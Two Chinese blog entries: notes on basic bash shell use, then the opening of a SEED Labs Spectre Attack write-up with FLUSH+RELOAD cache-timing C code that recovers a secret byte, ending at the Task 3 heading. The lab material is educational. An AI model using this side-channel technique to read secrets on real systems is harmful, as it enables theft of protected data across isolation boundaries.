    <content type="html"><![CDATA[<h1 id="shell-是什么">shell 是什么？</h1><p>如今的计算机有着多种多样的交互接口让我们可以进行指令的输入，从炫酷的图像用户界面（GUI），语音输入甚至是AR/VR 都已经无处不在。 这些交互接口可以覆盖 80%的使用场景，但是它们也从根本上限制了您的操作方式——你不能点击一个不存在的按钮或者是用语音输入一个还没有被录入的指令。为了充分利用计算机的能力，我们不得不回到最根本的方式，使用文字接口：Shell。</p><p>几乎所有您能够接触到的平台都支持某种形式的shell，有些甚至还提供了多种 shell供您选择。虽然它们之间有些细节上的差异，但是其核心功能都是一样的：它允许你执行程序，输入并获取某种半结构化的输出。</p><p>本节课我们会使用 Bourne Again SHell, 简称 “bash” 。这是被最广泛使用的一种 shell，它的语法和其他的 shell都是类似的。打开shell<em>提示符</em>（您输入指令的地方），您首先需要打开<em>终端</em>。您的设备通常都已经内置了终端，或者您也可以安装一个，非常简单。</p><h1 id="使用-shell">使用 shell</h1><p>当您打开终端时，您会看到一个提示符，它看起来一般是这个样子的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">missing:~$ <br></code></pre></td></tr></table></figure><p>这是 shell 最主要的文本接口。它告诉你，你的主机名是<code>missing</code> 并且您当前的工作目录（”current workingdirectory”）或者说您当前所在的位置是 <code>~</code> (表示 “home”)。<code>$</code> 符号表示您现在的身份不是 root用户（稍后会介绍）。在这个提示符中，您可以输入 <em>命令</em>，命令最终会被 shell 解析。最简单的命令是执行一个程序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">missing:~$ <span class="hljs-built_in">date</span><br>Fri 10 Jan 2020 11:49:31 AM EST<br>missing:~$ <br></code></pre></td></tr></table></figure><p>这里，我们执行了 <code>date</code>这个程序，不出意料地，它打印出了当前的日期和时间。然后，shell等待我们输入其他命令。我们可以在执行命令的同时向程序传递 <em>参数</em>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">missing:~$ <span class="hljs-built_in">echo</span> hello<br>hello<br></code></pre></td></tr></table></figure><p>上例中，我们让 shell 执行 <code>echo</code> ，同时指定参数<code>hello</code>。<code>echo</code> 程序将该参数打印出来。 shell<strong>基于空格分割命令</strong>并进行解析，然后执行第一个单词代表的程序，并将后续的单词作为程序可以访问的参数。如果您希望传递的参数中包含空格（例如一个名为My Photos的文件夹），您要么用使用单引号，双引号将其包裹起来，要么使用转义符号<code>\</code> 进行处理（<code>My\ Photos</code>）。</p><p>但是，shell 是如何知道去哪里寻找 <code>date</code> 或<code>echo</code> 的呢？其实，类似于 Python 或 Ruby，shell是一个编程环境，所以它具备变量、条件、循环和函数（下一课进行讲解）。当你在shell 中执行命令时，您实际上是在执行一段 shell可以解释执行的简短代码。如果你要求 shell 执行某个指令，但是该指令并不是shell 所了解的编程关键字，那么它会去咨询 <em>环境变量</em><code>$PATH</code>，它会列出当 shell接到某条指令时，进行程序搜索的路径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">missing:~$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br>missing:~$ <span class="hljs-built_in">which</span> <span class="hljs-built_in">echo</span><br>/bin/echo<br>missing:~$ /bin/echo <span class="hljs-variable">$PATH</span><br>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br></code></pre></td></tr></table></figure><p>当我们执行 <code>echo</code> 命令时，shell 了解到需要执行<code>echo</code> 这个程序，随后它便会在 <code>$PATH</code> 中搜索由<code>:</code>所分割的一系列目录，基于名字搜索该程序。当找到该程序时便执行（假定该文件是<em>可执行程序</em>，后续课程将详细讲解）。确定某个程序名代表的是哪个具体的程序，可以使用<code>which</code> 程序。我们也可以绕过<code>$PATH</code>，通过直接指定需要执行的程序的路径来执行该程序。</p><h1 id="在shell中导航">在shell中导航</h1><p>shell 中的路径是一组被分割的目录，在 Linux 和 macOS 上使用<code>/</code> 分割，而在Windows上是 <code>\</code>。路径 <code>/</code>代表的是系统的根目录，所有的文件夹都包括在这个路径之下，在Windows上每个盘都有一个根目录（例如：<code>C:\</code>）。 我们假设您在学习本课程时使用的是 Linux文件系统。如果某个路径以 <code>/</code> 开头，那么它是一个<em>绝对路径</em>，其他的都是 <em>相对路径</em>。相对路径是指相对于当前工作目录的路径，当前工作目录可以使用<code>pwd</code> 命令来获取。此外，切换目录需要使用 <code>cd</code>命令。在路径中，<code>.</code> 表示的是当前目录，而 <code>..</code>表示上级目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">missing:~$ <span class="hljs-built_in">pwd</span><br>/home/missing<br>missing:~$ <span class="hljs-built_in">cd</span> /home<br>missing:/home$ <span class="hljs-built_in">pwd</span><br>/home<br>missing:/home$ <span class="hljs-built_in">cd</span> ..<br>missing:/$ <span class="hljs-built_in">pwd</span><br>/<br>missing:/$ <span class="hljs-built_in">cd</span> ./home<br>missing:/home$ <span class="hljs-built_in">pwd</span><br>/home<br>missing:/home$ <span class="hljs-built_in">cd</span> missing<br>missing:~$ <span class="hljs-built_in">pwd</span><br>/home/missing<br>missing:~$ ../../bin/echo hello<br>hello<br></code></pre></td></tr></table></figure><p>注意，shell 会实时显示当前的路径信息。您可以通过配置 shell提示符来显示各种有用的信息，这一内容我们会在后面的课程中进行讨论。</p><p>一般来说，当我们运行一个程序时，如果我们没有指定路径，则该程序会在当前目录下执行。例如，我们常常会搜索文件，并在需要时创建文件。</p><p>为了查看指定目录下包含哪些文件，我们使用 <code>ls</code> 命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash'">missing:~$ ls<br>missing:~$ cd ..<br>missing:/home$ ls<br>missing<br>missing:/home$ cd ..<br>missing:/$ ls<br>bin<br>boot<br>dev<br>etc<br>home<br>...<br></code></pre></td></tr></table></figure><p>除非我们利用第一个参数指定目录，否则 <code>ls</code>会打印当前目录下的文件。大多数的命令接受标记和选项（带有值的标记），它们以<code>-</code> 开头，并可以改变程序的行为。通常，在执行程序时使用<code>-h</code> 或 <code>--help</code>标记可以打印帮助信息，以便了解有哪些可用的标记或选项。例如，<code>ls --help</code>的输出如下：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-comment">// 部分内容</span><br>  -l                         <span class="hljs-keyword">use</span> a long listing <span class="hljs-keyword">format</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">missing:~$ <span class="hljs-built_in">ls</span> -l /home<br>drwxr-xr-x 1 missing  <span class="hljs-built_in">users</span>  4096 Jun 15  2019 missing<br></code></pre></td></tr></table></figure><p>这个参数可以更加详细地列出目录下文件或文件夹的信息。首先，本行第一个字符<code>d</code> 表示 <code>missing</code>是一个目录。然后接下来的九个字符，每三个字符构成一组。（<code>rwx</code>）.它们分别代表了文件所有者（<code>missing</code>），用户组（<code>users</code>）以及其他所有人具有的权限。其中 <code>-</code>表示该用户不具备相应的权限。从上面的信息来看，只有文件所有者可以修改（<code>w</code>），<code>missing</code>文件夹（例如，添加或删除文件夹中的文件）。为了进入某个文件夹，用户需要具备该文件夹以及其父文件夹的“搜索”权限（以“可执行”：<code>x</code>）权限表示。为了列出它的包含的内容，用户必须对该文件夹具备读权限（<code>r</code>）。对于文件来说，权限的意义也是类似的。注意，<code>/bin</code>目录下的程序在最后一组，即表示所有人的用户组中，均包含 <code>x</code>权限，也就是说任何人都可以执行这些程序。</p><p>在这个阶段，还有几个趁手的命令是您需要掌握的，例如<code>mv</code>（用于重命名或移动文件）、<code>cp</code>（拷贝文件）以及 <code>mkdir</code>（新建文件夹）。</p><p>如果您想要知道关于程序参数、输入输出的信息，亦或是想要了解它们的工作方式，请试试<code>man</code>这个程序。它会接受一个程序名作为参数，然后将它的文档（用户手册）展现给您。注意，使用<code>q</code> 可以退出该程序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">missing:~$ man <span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><h1 id="在程序间创建连接">在程序间创建连接</h1><p>在 shell 中，程序有两个主要的“流”：它们的输入流和输出流。当程序尝试读取信息时，它们会从输入流中进行读取，当程序打印信息时，它们会将信息输出到输出流中。通常，一个程序的输入输出流都是您的终端。也就是，您的键盘作为输入，显示器作为输出。但是，我们也可以重定向这些流！</p><p>最简单的重定向是 <code>&lt; file</code> 和<code>&gt; file</code>。这两个命令可以将程序的输入输出流分别重定向到文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">missing:~$ <span class="hljs-built_in">echo</span> hello &gt; hello.txt<br>missing:~$ <span class="hljs-built_in">cat</span> hello.txt<br>hello<br>missing:~$ <span class="hljs-built_in">cat</span> &lt; hello.txt<br>hello<br>missing:~$ <span class="hljs-built_in">cat</span> &lt; hello.txt &gt; hello2.txt<br>missing:~$ <span class="hljs-built_in">cat</span> hello2.txt<br>hello<br></code></pre></td></tr></table></figure><p>您还可以使用 <code>&gt;&gt;</code> 来向一个文件追加内容。使用管道（<em>pipes</em> ），我们能够更好的利用文件重定向。 <code>|</code>操作符允许我们将一个程序的输出和另外一个程序的输入连接起来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">missing:~$ <span class="hljs-built_in">ls</span> -l / | <span class="hljs-built_in">tail</span> -n1<br>drwxr-xr-x 1 root  root  4096 Jun 20  2019 var<br>missing:~$ curl --<span class="hljs-built_in">head</span> --silent google.com | grep --ignore-case content-length | <span class="hljs-built_in">cut</span> --delimiter=<span class="hljs-string">&#x27; &#x27;</span> -f2<br>219<br></code></pre></td></tr></table></figure><p>我们会在数据清理一章中更加详细的探讨如何更好的利用管道。</p><h1 id="一个功能全面又强大的工具">一个功能全面又强大的工具</h1><p>对于大多数的类 Unix系统，有一类用户是非常特殊的，那就是：根用户（root user）。您应该已经注意到了，在上面的输出结果中，根用户几乎不受任何限制，他可以创建、读取、更新和删除系统中的任何文件。通常在我们并不会以根用户的身份直接登录系统，因为这样可能会因为某些错误的操作而破坏系统。取而代之的是我们会在需要的时候使用 <code>sudo</code>命令。顾名思义，它的作用是让您可以以 su（super user 或 root的简写）的身份执行一些操作。 当您遇到拒绝访问（permissiondenied）的错误时，通常是因为此时您必须是根用户才能操作。然而，请再次确认您是真的要执行此操作。</p><p>有一件事情是您必须作为根用户才能做的，那就是向 sysfs文件写入内容。系统被挂载在 /sys 下，sysfs文件则暴露了一些内核（kernel）参数。因此，您不需要借助任何专用的工具，就可以轻松地在运行期间配置系统内核。注意Windows 和 macOS 没有这个文件。</p><p>例如，您笔记本电脑的屏幕亮度写在 <code>brightness</code>文件中，它位于</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/sys/</span><span class="hljs-keyword">class</span>/backlight<br></code></pre></td></tr></table></figure><p>通过将数值写入该文件，我们可以改变屏幕的亮度。现在，蹦到您脑袋里的第一个想法可能是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo find -L /sys/class/backlight -maxdepth 2 -name <span class="hljs-string">&#x27;*brightness*&#x27;</span><br>/sys/class/backlight/thinkpad_screen/brightness<br>$ <span class="hljs-built_in">cd</span> /sys/class/backlight/thinkpad_screen<br>$ sudo <span class="hljs-built_in">echo</span> 3 &gt; brightness<br>An error occurred <span class="hljs-keyword">while</span> redirecting file <span class="hljs-string">&#x27;brightness&#x27;</span><br>open: Permission denied<br></code></pre></td></tr></table></figure><p>出乎意料的是，我们还是得到了一个错误信息。毕竟，我们已经使用了<code>sudo</code> 命令！关于shell，有件事我们必须要知道。<code>|</code>、<code>&gt;</code>、和<code>&lt;</code> 是通过 shell 执行的，而不是被各个程序单独执行。<code>echo</code> 等程序并不知道 <code>|</code>的存在，它们只知道从自己的输入输出流中进行读写。 对于上面这种情况，<em>shell</em> (权限为您的当前用户) 在设置 <code>sudo echo</code>前尝试打开 brightness 文件并写入，但是系统拒绝了 shell 的操作因为此时shell 不是根用户。</p><p>明白这一点后，我们可以这样操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> 3 | sudo <span class="hljs-built_in">tee</span> brightness<br></code></pre></td></tr></table></figure><p>因为打开 <code>/sys</code> 文件的是 <code>tee</code>这个程序，并且该程序以 <code>root</code> 权限在运行，因此操作可以进行。这样您就可以在 <code>/sys</code>中愉快地玩耍了，例如修改系统中各种LED的状态（路径可能会有所不同）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> 1 | sudo <span class="hljs-built_in">tee</span> /sys/class/leds/input6::scrolllock/brightness<br></code></pre></td></tr></table></figure><p>参考教程：</p><ol type="1"><li>https://missing-semester-cn.github.io/2020/course-shell/</li><li>https://missing-semester-cn.github.io/missing-notes-and-solutions/2020/solutions/course-shell-solution/</li><li>https://www.youtube.com/watch?v=Z56Jmr9Z34Q</li></ol>]]></content>
    
    
    <categories>
      
      <category>计算机核心课程</category>
      
      <category>The Missing Semester of Your CS Education</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Spectre Attack</title>
    <link href="/2023/12/06/SEED-LABS/System%20Security/Spectre%20Attack/"/>
    <url>/2023/12/06/SEED-LABS/System%20Security/Spectre%20Attack/</url>
    
    <content type="html"><![CDATA[<h1 id="introduction">1. Introduction</h1><p>Spectre 攻击于 2017 年被发现，并于 2018 年 1月公开披露，它利用了许多现代处理器（包括英特尔、AMD 和 ARM的处理器）中存在的关键漏洞。这些漏洞允许程序打破<strong>进程间</strong>和<strong>进程内</strong>的隔离，因此恶意程序可以从其无法访问的区域读取数据。硬件保护机制（用于进程间隔离）或软件保护机制（用于进程内隔离）都不允许这样的访问，但CPU设计中存在的一个漏洞使破坏保护成为可能。由于漏洞存在于硬件中，除非我们更换计算机中的CPU，否则很难从根本上解决问题。Spectre 漏洞代表了 CPU设计中的一类特殊漏洞，它与 Meltdown漏洞一起，为安全教育提供了宝贵的一课。</p><p>本实验的学习目标是让学生获得有关 Spectre 攻击的第一手经验。该攻击本身相当复杂，因此我们将其分解为几个小步骤，每个步骤都易于理解和执行。学生一旦理解了每个步骤，就不难将所有内容整合在一起进行实际攻击。本实验室涵盖以下描述的多个主题：</p><ul><li>频谱攻击</li><li>侧通道攻击</li><li>CPU 缓存</li><li>CPU 微体系结构内的失序执行和分支预测</li></ul><h1 id="code-compilation">2. Code Compilation</h1><p>在 Ubuntu 20.04 操作系统中，包含 -march=native选项可能会导致某些电脑出错。根据我们的调试工作，似乎不再需要这个选项。因此，如果由于该选项而遇到错误，请尝试不使用该选项进行编译：<code>gcc -o myprog myprog.c</code>。</p><h1 id="tasks-1-and-2-side-channel-attacks-via-cpu-caches">3. Tasks 1and 2: Side Channel Attacks via CPU Caches</h1><p>Meltdown 和 Spectre 攻击都利用 CPU缓存作为侧信道来窃取受保护的秘密。这种侧通道攻击使用的技术称为FLUSH+RELOAD。我们将首先研究这种技术。在这两项任务中开发的代码将在后面的任务中用作构建模块。</p><p>CPU 缓存是计算机 CPU使用的硬件缓存，用于降低从主存储器访问数据的平均成本（时间或能量）。从CPU 缓存访问数据要比从主存储器访问快得多。从主存储器获取数据后，CPU通常会将其缓存起来，因此如果再次使用相同的数据，访问时间会大大缩短。因此，当CPU 需要访问某些数据时，它首先会查看缓存。如果数据在缓存中（称为<strong>缓存命中</strong>），则会直接从缓存中获取。如果数据不在（称为<strong>未命中</strong>），CPU将转到主内存获取数据。后一种情况花费的时间要长得多。大多数现代 CPU 都有CPU 缓存。</p><h2 id="task-1-reading-from-cache-versus-from-memory">3.1 Task 1:Reading from Cache versus from Memory</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018492.png"alt="image-20231206095207706" /><figcaption aria-hidden="true">image-20231206095207706</figcaption></figure><p>高速缓存用于以更快的速度向高速处理器提供数据。与主内存相比，高速缓存的速度非常快。让我们看看时间差。在下面的代码（CacheTime.c）中，我们有一个大小为<code>10*4096</code>的数组。我们首先访问其中的两个元素，即<code>array[3*4096]</code>和<code>array[7*4096]</code>。因此，包含这两个元素的页面将被缓存。然后，我们从数组<code>[0*4096]</code>到数组<code>[9*4096]</code>读取元素，并测量在内存读取中花费的时间。图1 说明了两者之间的差异。在代码中，第 ➀ 行在读取内存之前读取 CPU 的时间戳(TSC) 计数器，而第➁行在读取内存之后读取计数器。它们的区别在于读取内存所花费的时间（CPU周期数）。需要注意的是，缓存是在缓存块级别而非字节级别完成的。典型的缓存块大小为64 字节。我们使用<code>array[k*4096]</code>，因此程序中使用的两个元素都不属于同一个缓存块。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018494.png"alt="image-20231206095407060" /><figcaption aria-hidden="true">image-20231206095407060</figcaption></figure><p>请使用<code>gcc -o CacheTime CacheTime.c</code>编译以下代码并运行。访问数组<code>[3*4096]</code>和数组<code>[7*4096]</code>是否比访问其他元素快？请运行程序至少10次，并描述您的观察结果。从实验中，您需要找到一个阈值，用来区分这两种内存访问：从高速缓存访问数据和从主存访问数据。这个阈值对本实验室的其他任务非常重要。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>代码理解：这段代码是用于进行一种叫做"Cache Side-ChannelAttack"（缓存侧信道攻击）的测试。这种攻击利用处理器缓存的行为，尝试推断访问模式和速度来获取信息。代码实现流程：</p><ul><li>初始化数组：在内存中创建一个数组array，并将每隔4096字节的位置设置为1。</li><li>清除CPU缓存：通过<code>_mm_clflush</code>函数，将 array中每隔4096字节的位置的数据从CPU缓存中清除，确保后续的访问会从主内存中读取。</li><li>访问数组元素：手动访问数组中的某些元素（在这里是第3个和第7个4096字节位置），这样它们会从主内存加载到CPU缓存中。</li><li>计算访问时间：通过循环，逐个访问数组元素，并测量访问每个元素所需的CPU周期数。这是通过__rdtscp 函数实现的，➀ 表示开始计时，➁表示结束计时并计算访问所需的CPU周期数。这个周期数可能反映了数据是否已经存在于CPU缓存中，或者是否需要从主内存中加载。</li></ul></li><li><p>编译代码并多次（10次以上）运行。现象：访问数组<code>[3*4096]</code>和数组<code>[7*4096]</code>比访问其他元素快。结论：直接从高速缓存访问数据所需时间通常小于100个CPU周期，从主存访问数据通常大于200个CPU周期。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018495.png"alt="image-20231206095557120" /><figcaption aria-hidden="true">image-20231206095557120</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018496.png"alt="image-20231206095609181" /><figcaption aria-hidden="true">image-20231206095609181</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018497.png"alt="image-20231206095615433" /><figcaption aria-hidden="true">image-20231206095615433</figcaption></figure></li></ol><h2 id="task-2-using-cache-as-a-side-channel">3.2 Task 2: Using Cache asa Side Channel</h2><p>本任务的目标是利用侧信道提取受害者函数使用的秘密值。假设有一个受害者函数使用秘密值作为索引，从数组中加载一些值。还假设无法从外部访问该秘密值。我们的目标是利用侧信道获取这个秘密值。我们将使用的技术称为<code>FLUSH+RELOAD</code>。图2 展示了该技术，包括三个步骤：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018498.png"alt="image-20231206095743711" /><figcaption aria-hidden="true">image-20231206095743711</figcaption></figure><ol type="1"><li>将整个数组从缓存内存中清除，以确保数组未被缓存。</li><li>调用受害者函数，根据秘密值访问数组中的一个元素。这一操作会导致相应的数组元素被缓存。</li><li>重新加载整个数组，并测量重新加载每个元素所需的时间。如果某个元素的加载时间较快，则很有可能该元素已在缓存中。这个元素肯定就是受害者函数所访问的元素。因此，我们可以找出秘密值。</li></ol><p>下面的程序使用<code>FLUSH+RELOAD</code>技术来找出变量 secret中的一个字节秘密值。由于一个字节的秘密值可能有 256个，我们需要将每个值映射到一个数组元素。最简单的方法是定义一个包含 256个元素的数组（即 array[256]）。然而，这种方法行不通。缓存是在块级而不是字节级完成的。如果访问array[k]，包含该元素的内存块将被缓存。因此，array[k]中相邻的元素也会被缓存，从而难以推断出秘密是什么。为了解决这个问题，我们创建了一个<code>256*4096</code>字节的数组。RELOAD 步骤中使用的每个元素都是<code>array[k*4096]</code>。由于 4096 比典型的缓存块大小（64字节）要大，因此没有两个不同的元素 <code>array[i*4096]</code> 和<code>array[j*4096]</code>会出现在同一个缓存块中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// FlushReload.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;emmintrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;x86intrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">uint8_t</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">256</span>*<span class="hljs-number">4096</span>];<br><span class="hljs-type">int</span> temp;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> secret = <span class="hljs-number">94</span>;<br><span class="hljs-comment">/* cache hit time threshold assumed*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CACHE_HIT_THRESHOLD (80)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 1024</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">victim</span><span class="hljs-params">()</span><br>&#123;<br>  temp = <span class="hljs-built_in">array</span>[secret*<span class="hljs-number">4096</span> + DELTA];<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">flushSideChannel</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-comment">// Write to array to bring it to RAM to prevent Copy-on-write</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) <span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA] = <span class="hljs-number">1</span>;<br>  <span class="hljs-comment">//flush the values of the array from cache</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> +DELTA]);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">reloadSideChannel</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> junk=<span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">register</span> <span class="hljs-type">uint64_t</span> time1, time2;<br>  <span class="hljs-keyword">volatile</span> <span class="hljs-type">uint8_t</span> *addr;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)&#123;<br>   addr = &amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA];<br>   time1 = __rdtscp(&amp;junk);<br>   junk = *addr;<br>   time2 = __rdtscp(&amp;junk) - time1;<br>   <span class="hljs-keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;array[%d*4096 + %d] is in cache.\n&quot;</span>, i, DELTA);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The Secret = %d.\n&quot;</span>,i);<br>   &#125;<br>  &#125; <br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>  flushSideChannel();<br>  victim();<br>  reloadSideChannel();<br>  <span class="hljs-keyword">return</span> (<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>由于<code>array[0*4096]</code>可能与相邻内存中的变量属于同一个缓存块，因此可能会因为这些变量的缓存而被意外缓存。因此，我们应该避免在<code>FLUSH+RELOAD</code>方法中使用<code>array[0*4096]</code>（对于其他索引k，<code>array[k*4096]</code>不存在问题）。为了在程序中保持一致，我们对所有k 值都使用 <code>array[k*4096 + DELTA]</code>，其中 DELTA 定义为常数1024。</p><p>请使用 gcc 编译程序并运行（编译说明见第 2节）。需要注意的是，该技术并非百分之百准确，您可能无法一直观察到预期的输出结果。运行程序至少20 次，数一数有多少次能正确得到秘密。您也可以将 CACHE HIT THRESHOLD临界值调整为任务 1 中得出的临界值（本代码中使用的是 80）。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>代码理解：这段代码是一个演示“缓存侧信道攻击”的示例。这种攻击利用处理器缓存的特性，通过测量访问时间来推断内存中的数据。代码流程：</p><ul><li>flushSideChannel() 函数：首先，它通过循环写入数据来确保 array中的所有位置都在RAM中，并防止写时复制（Copy-on-write）。然后，它通过_mm_clflush 函数将 array中的数据从CPU缓存中清除，使得后续访问需要从主内存加载数据。</li><li>victim() 函数：这个函数访问了数组 array 中的某个位置。它访问了array[secret*4096 + DELTA] 这个位置，其中 secret是一个无符号字符型变量，DELTA 是一个偏移量。</li><li>reloadSideChannel() 函数：这个函数通过测量访问 array中每个位置所需的时间来判断哪些位置的数据存在于CPU缓存中。它使用 __rdtscp函数来测量访问时间，并检查访问时间是否小于预先设定的阈值CACHE_HIT_THRESHOLD。如果访问时间小于阈值，就意味着相应的数据在CPU缓存中，通过打印输出相关信息来指示发生了缓存命中。</li><li>在 main() 函数中，首先调用 flushSideChannel()来初始化和清除CPU缓存，然后调用 victim()函数来访问数组中的某个位置，最后调用 reloadSideChannel()来检测缓存命中情况，从而推断出 secret 变量的值。</li></ul></li><li><p>修改<code>CACHE HIT THRESHOLD</code>为100，编译并多次运行代码。运行24次，均正确得到秘密。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018499.png"alt="image-20231206100133117" /><figcaption aria-hidden="true">image-20231206100133117</figcaption></figure></li></ol><h1 id="task-3-out-of-order-execution-and-branch-prediction">4. Task 3:Out-of-Order Execution and Branch Prediction</h1><p>本任务的目的是了解 CPU的乱序执行。我们将通过一个实验来帮助学生观察这种执行。</p><h2 id="out-of-order-execution">4.1 Out-Of-Order 